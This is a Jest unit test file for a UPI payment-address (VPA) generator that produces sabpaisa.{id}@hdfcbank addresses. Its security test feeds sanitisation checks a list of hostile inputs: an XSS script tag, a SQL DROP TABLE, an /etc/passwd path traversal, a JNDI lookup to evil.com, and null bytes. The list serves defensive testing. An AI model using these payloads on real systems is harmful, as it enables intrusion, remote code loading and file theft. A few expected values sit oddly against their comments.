/**
 * VPA Generator Unit Tests
 * Testing the VPA generation system for Static QR Payment Integration
 * Critical for ensuring unique VPA generation across multi-merchant environment
 */

import VPAGenerator, { VPA_CONFIG } from '../src/utilities/vpaGenerator';

describe('VPAGenerator - Core Functionality', () => {
    
    describe('generateMerchantPrefix', () => {
        test('should generate 3-character prefix for SRS Live Technologies', () => {
            const result = VPAGenerator.generateMerchantPrefix('SRS Live Technologies');
            expect(result).toBe('slt'); // Should be 'srs' + 'live' + 'technologies' = 'slt'
        });

        test('should handle empty company name with default', () => {
            const result = VPAGenerator.generateMerchantPrefix('');
            expect(result).toBe('mer');
        });

        test('should handle null company name with default', () => {
            const result = VPAGenerator.generateMerchantPrefix(null);
            expect(result).toBe('mer');
        });

        test('should handle undefined company name with default', () => {
            const result = VPAGenerator.generateMerchantPrefix(undefined);
            expect(result).toBe('mer');
        });

        test('should ignore common words in company names', () => {
            const result = VPAGenerator.generateMerchantPrefix('ABC Retail Store Pvt Ltd');
            expect(result).toBe('ars'); // Should ignore 'Pvt' and 'Ltd'
        });

        test('should handle single word company names', () => {
            const result = VPAGenerator.generateMerchantPrefix('Amazon');
            expect(result).toBe('ama'); // First 3 characters
        });

        test('should handle two word company names', () => {
            const result = VPAGenerator.generateMerchantPrefix('Google Inc');
            expect(result).toBe('gox'); // 'g' + 'i' + second letter of first word
        });

        test('should handle company names with special characters', () => {
            const result = VPAGenerator.generateMerchantPrefix('Tech-Solutions & Co.');
            expect(result).toBe('tsc'); // Should handle hyphens and ampersands
        });

        test('should handle very long company names', () => {
            const result = VPAGenerator.generateMerchantPrefix('Very Long Company Name With Multiple Words International');
            expect(result).toBe('vlc'); // First 3 significant words
        });

        test('should be case insensitive but return lowercase', () => {
            const result = VPAGenerator.generateMerchantPrefix('MICROSOFT CORPORATION');
            expect(result).toBe('mic');
            expect(result).toMatch(/^[a-z]{3}$/); // Should be lowercase
        });
    });

    describe('generateUniqueVPA', () => {
        test('should generate VPA for SRS Live Technologies with win25 identifier (Requirements test case)', () => {
            const result = VPAGenerator.generateUniqueVPA({
                identifier: 'win25',
                merchantName: 'SRS Live Technologies',
                strategy: 'prefix'
            });
            
            expect(result).toBe('sabpaisa.sltwin25@hdfcbank');
        });

        test('should generate different VPAs for different merchants with same identifier', () => {
            const vpa1 = VPAGenerator.generateUniqueVPA({
                identifier: 'win25',
                merchantName: 'SRS Live Technologies',
                strategy: 'prefix'
            });
            
            const vpa2 = VPAGenerator.generateUniqueVPA({
                identifier: 'win25',
                merchantName: 'ABC Store',
                strategy: 'prefix'
            });
            
            expect(vpa1).toBe('sabpaisa.sltwin25@hdfcbank');
            expect(vpa2).toBe('sabpaisa.abcwin25@hdfcbank');
            expect(vpa1).not.toBe(vpa2); // Critical: No collision
        });

        test('should handle different VPA generation strategies', () => {
            const prefixVPA = VPAGenerator.generateUniqueVPA({
                identifier: 'store01',
                merchantName: 'ABC Retail',
                strategy: 'prefix'
            });
            
            const suffixVPA = VPAGenerator.generateUniqueVPA({
                identifier: 'store01',
                merchantName: 'ABC Retail',
                strategy: 'suffix'
            });
            
            const mixedVPA = VPAGenerator.generateUniqueVPA({
                identifier: 'store01',
                merchantName: 'ABC Retail',
                strategy: 'mixed'
            });
            
            expect(prefixVPA).toBe('sabpaisa.abcstore01@hdfcbank');
            expect(suffixVPA).toBe('sabpaisa.store01abc@hdfcbank');
            expect(mixedVPA).toBe('sabpaisa.abstore01c@hdfcbank');
        });

        test('should clean and sanitize identifiers', () => {
            const result = VPAGenerator.generateUniqueVPA({
                identifier: 'Win@25#Special!',
                merchantName: 'Test Company',
                strategy: 'prefix'
            });
            
            expect(result).toBe('sabpaisa.teswin25special@hdfcbank');
            expect(result).toMatch(/^sabpaisa\.[a-z0-9]+@hdfcbank$/); // Only alphanumeric
        });

        test('should handle long identifiers by truncating', () => {
            const result = VPAGenerator.generateUniqueVPA({
                identifier: 'verylongidentifierthatexceedslimits',
                merchantName: 'Test Company',
                strategy: 'prefix'
            });
            
            const vpaIdentifier = result.split('.')[1].split('@')[0];
            expect(vpaIdentifier.length).toBeLessThanOrEqual(20); // HDFC limit
        });

        test('should use default identifier when none provided', () => {
            const result = VPAGenerator.generateUniqueVPA({
                merchantName: 'Test Company',
                strategy: 'prefix'
            });
            
            expect(result).toBe('sabpaisa.tesdefault@hdfcbank');
        });

        test('should handle empty identifier', () => {
            const result = VPAGenerator.generateUniqueVPA({
                identifier: '',
                merchantName: 'Test Company',
                strategy: 'prefix'
            });
            
            expect(result).toBe('sabpaisa.tesdefault@hdfcbank');
        });
    });

    describe('generateHashedVPA', () => {
        test('should generate VPA with merchant ID hash', () => {
            const result = VPAGenerator.generateHashedVPA({
                identifier: 'main',
                merchantId: 'HDFC000010380443'
            });
            
            expect(result).toBe('sabpaisa.443main@hdfcbank');
        });

        test('should handle short merchant IDs', () => {
            const result = VPAGenerator.generateHashedVPA({
                identifier: 'test',
                merchantId: '12'
            });
            
            expect(result).toBe('sabpaisa.12test@hdfcbank');
        });

        test('should fallback to regular generation without merchant ID', () => {
            const result = VPAGenerator.generateHashedVPA({
                identifier: 'test',
                merchantName: 'Test Company'
            });
            
            expect(result).toBe('sabpaisa.testest@hdfcbank');
        });
    });

    describe('validateVPA', () => {
        test('should validate correct VPA format', () => {
            const validVPAs = [
                'sabpaisa.sltwin25@hdfcbank',
                'sabpaisa.abc123@hdfcbank',
                'sabpaisa.test@hdfcbank',
                'sabpaisa.a1b2c3@hdfcbank'
            ];
            
            validVPAs.forEach(vpa => {
                expect(VPAGenerator.validateVPA(vpa)).toBe(true);
            });
        });

        test('should reject invalid VPA formats', () => {
            const invalidVPAs = [
                'sabpaisa.@hdfcbank', // Empty identifier
                'sabpaisa.verylongidentifierthatexceedslimits@hdfcbank', // Too long
                'sabpaisa.test@wrongbank', // Wrong bank
                'wrongprefix.test@hdfcbank', // Wrong prefix
                'sabpaisa.test-with-dash@hdfcbank', // Invalid characters
                'sabpaisa.TEST@hdfcbank', // Uppercase not allowed
                'sabpaisa.test@', // No bank
                'sabpaisa.test', // Incomplete
                '@hdfcbank', // No prefix or identifier
                '' // Empty string
            ];
            
            invalidVPAs.forEach(vpa => {
                expect(VPAGenerator.validateVPA(vpa)).toBe(false);
            });
        });

        test('should be case sensitive', () => {
            expect(VPAGenerator.validateVPA('SABPAISA.TEST@HDFCBANK')).toBe(false);
            expect(VPAGenerator.validateVPA('sabpaisa.test@HDFCBANK')).toBe(false);
            expect(VPAGenerator.validateVPA('sabpaisa.TEST@hdfcbank')).toBe(false);
        });
    });

    describe('parseVPA', () => {
        test('should correctly parse valid VPA', () => {
            const result = VPAGenerator.parseVPA('sabpaisa.sltwin25@hdfcbank');
            
            expect(result).toEqual({
                full: 'sabpaisa.sltwin25@hdfcbank',
                identifier: 'sltwin25',
                merchantPrefix: 'slt',
                userIdentifier: 'win25',
                bank: 'hdfcbank'
            });
        });

        test('should return null for invalid VPA', () => {
            const result = VPAGenerator.parseVPA('invalid.vpa@bank');
            expect(result).toBeNull();
        });

        test('should handle short identifiers', () => {
            const result = VPAGenerator.parseVPA('sabpaisa.ab@hdfcbank');
            
            expect(result).toEqual({
                full: 'sabpaisa.ab@hdfcbank',
                identifier: 'ab',
                merchantPrefix: 'ab',
                userIdentifier: '',
                bank: 'hdfcbank'
            });
        });
    });

    describe('Edge Cases and Error Handling', () => {
        test('should handle extremely long merchant names', () => {
            const longName = 'A'.repeat(1000) + ' ' + 'B'.repeat(1000) + ' ' + 'C'.repeat(1000);
            const result = VPAGenerator.generateMerchantPrefix(longName);
            
            expect(result).toHaveLength(3);
            expect(result).toMatch(/^[a-z]{3}$/);
        });

        test('should handle merchant names with only common words', () => {
            const result = VPAGenerator.generateMerchantPrefix('Pvt Ltd Inc Corporation');
            expect(result).toBe('xxx'); // Should pad with x when no significant words
        });

        test('should handle merchant names with numbers', () => {
            const result = VPAGenerator.generateMerchantPrefix('123 Tech Solutions 456');
            expect(result).toBe('1ts');
        });

        test('should handle merchant names with emojis and unicode', () => {
            const result = VPAGenerator.generateMerchantPrefix('🚀 Tech Solutions 💻');
            // Should handle unicode gracefully
            expect(result).toHaveLength(3);
            expect(typeof result).toBe('string');
        });

        test('should handle null/undefined parameters gracefully', () => {
            expect(() => {
                VPAGenerator.generateUniqueVPA(null);
            }).not.toThrow();

            expect(() => {
                VPAGenerator.generateUniqueVPA(undefined);
            }).not.toThrow();

            expect(() => {
                VPAGenerator.generateUniqueVPA({});
            }).not.toThrow();
        });

        test('should handle concurrent generation scenarios', () => {
            // Simulate multiple requests with same parameters
            const promises = Array.from({ length: 100 }, (_, i) => 
                VPAGenerator.generateUniqueVPA({
                    identifier: `test${i}`,
                    merchantName: 'Test Company',
                    strategy: 'prefix'
                })
            );
            
            return Promise.all(promises).then(results => {
                // All should be unique
                const uniqueVPAs = new Set(results);
                expect(uniqueVPAs.size).toBe(results.length);
                
                // All should be valid format
                results.forEach(vpa => {
                    expect(VPAGenerator.validateVPA(vpa)).toBe(true);
                });
            });
        });
    });

    describe('Business Logic Validation', () => {
        test('should prevent VPA collisions between merchants - CRITICAL TEST', () => {
            const merchants = [
                'SRS Live Technologies',
                'ABC Retail Store',
                'XYZ Enterprises',
                'Tech Solutions',
                'Global Services'
            ];
            
            const identifier = 'store01'; // Same identifier for all
            const vpas = merchants.map(merchant => 
                VPAGenerator.generateUniqueVPA({
                    identifier,
                    merchantName: merchant,
                    strategy: 'prefix'
                })
            );
            
            // All VPAs should be unique
            const uniqueVPAs = new Set(vpas);
            expect(uniqueVPAs.size).toBe(merchants.length);
            
            // All should be valid
            vpas.forEach(vpa => {
                expect(VPAGenerator.validateVPA(vpa)).toBe(true);
            });
            
            console.log('Generated unique VPAs:', vpas);
        });

        test('should comply with HDFC VPA format requirements', () => {
            const vpa = VPAGenerator.generateUniqueVPA({
                identifier: 'win25',
                merchantName: 'SRS Live Technologies',
                strategy: 'prefix'
            });
            
            // Must match HDFC format: sabpaisa.{identifier}@hdfcbank
            expect(vpa).toMatch(/^sabpaisa\.[a-z0-9]{1,20}@hdfcbank$/);
            
            // Must not exceed HDFC limits
            const identifier = vpa.split('.')[1].split('@')[0];
            expect(identifier.length).toBeLessThanOrEqual(20);
        });

        test('should generate examples for documentation', () => {
            const examples = VPAGenerator.generateExamples();
            
            expect(examples).toHaveLength(4);
            examples.forEach(example => {
                expect(example).toHaveProperty('company');
                expect(example).toHaveProperty('identifier');
                expect(example).toHaveProperty('strategy');
                expect(example).toHaveProperty('result');
                expect(VPAGenerator.validateVPA(example.result)).toBe(true);
            });
            
            // Log examples for documentation
            console.log('VPA Generation Examples:', examples);
        });
    });

    describe('Performance Tests', () => {
        test('should generate VPA quickly (< 10ms)', () => {
            const startTime = performance.now();
            
            VPAGenerator.generateUniqueVPA({
                identifier: 'performance',
                merchantName: 'Performance Test Company',
                strategy: 'prefix'
            });
            
            const endTime = performance.now();
            const duration = endTime - startTime;
            
            expect(duration).toBeLessThan(10); // Should be very fast
        });

        test('should handle batch generation efficiently', () => {
            const startTime = performance.now();
            
            const results = Array.from({ length: 1000 }, (_, i) => 
                VPAGenerator.generateUniqueVPA({
                    identifier: `batch${i}`,
                    merchantName: `Merchant ${i}`,
                    strategy: 'prefix'
                })
            );
            
            const endTime = performance.now();
            const duration = endTime - startTime;
            
            expect(results).toHaveLength(1000);
            expect(duration).toBeLessThan(1000); // Should complete within 1 second
            
            // All should be unique
            const uniqueResults = new Set(results);
            expect(uniqueResults.size).toBe(1000);
        });
    });

    describe('Configuration Tests', () => {
        test('should have correct VPA configuration', () => {
            expect(VPA_CONFIG.MAX_IDENTIFIER_LENGTH).toBe(20);
            expect(VPA_CONFIG.PREFIX_LENGTH).toBe(3);
            expect(VPA_CONFIG.BANKS.UAT).toBe('hdfcbank');
            expect(VPA_CONFIG.BANKS.PRODUCTION).toBe('hdfcbank');
        });

        test('should have proper strategies defined', () => {
            expect(VPA_CONFIG.STRATEGIES.PREFIX).toBe('prefix');
            expect(VPA_CONFIG.STRATEGIES.SUFFIX).toBe('suffix');
            expect(VPA_CONFIG.STRATEGIES.MIXED).toBe('mixed');
            expect(VPA_CONFIG.STRATEGIES.HASHED).toBe('hashed');
        });

        test('should have reserved identifiers list', () => {
            expect(VPA_CONFIG.RESERVED).toContain('admin');
            expect(VPA_CONFIG.RESERVED).toContain('test');
            expect(VPA_CONFIG.RESERVED).toContain('demo');
            expect(VPA_CONFIG.RESERVED).toContain('system');
        });
    });
});

describe('VPAGenerator - Security Tests', () => {
    test('should reject reserved identifiers', () => {
        const reservedIdentifiers = ['admin', 'test', 'demo', 'system'];
        
        reservedIdentifiers.forEach(reserved => {
            const vpa = VPAGenerator.generateUniqueVPA({
                identifier: reserved,
                merchantName: 'Test Company',
                strategy: 'prefix'
            });
            
            // Should not use reserved identifier as-is
            expect(vpa).not.toContain(reserved);
        });
    });

    test('should sanitize malicious input', () => {
        const maliciousInputs = [
            '<script>alert("xss")</script>',
            'DROP TABLE users;',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com}',
            '%00null%00'
        ];
        
        maliciousInputs.forEach(malicious => {
            expect(() => {
                const vpa = VPAGenerator.generateUniqueVPA({
                    identifier: malicious,
                    merchantName: malicious,
                    strategy: 'prefix'
                });
                
                expect(vpa).toMatch(/^sabpaisa\.[a-z0-9]+@hdfcbank$/);
            }).not.toThrow();
        });
    });

    test('should not leak sensitive information in VPAs', () => {
        const vpa = VPAGenerator.generateUniqueVPA({
            identifier: 'secret123',
            merchantName: 'Confidential Business Ltd',
            strategy: 'prefix'
        });
        
        // VPA should not contain full merchant name
        expect(vpa.toLowerCase()).not.toContain('confidential');
        expect(vpa.toLowerCase()).not.toContain('business');
    });
});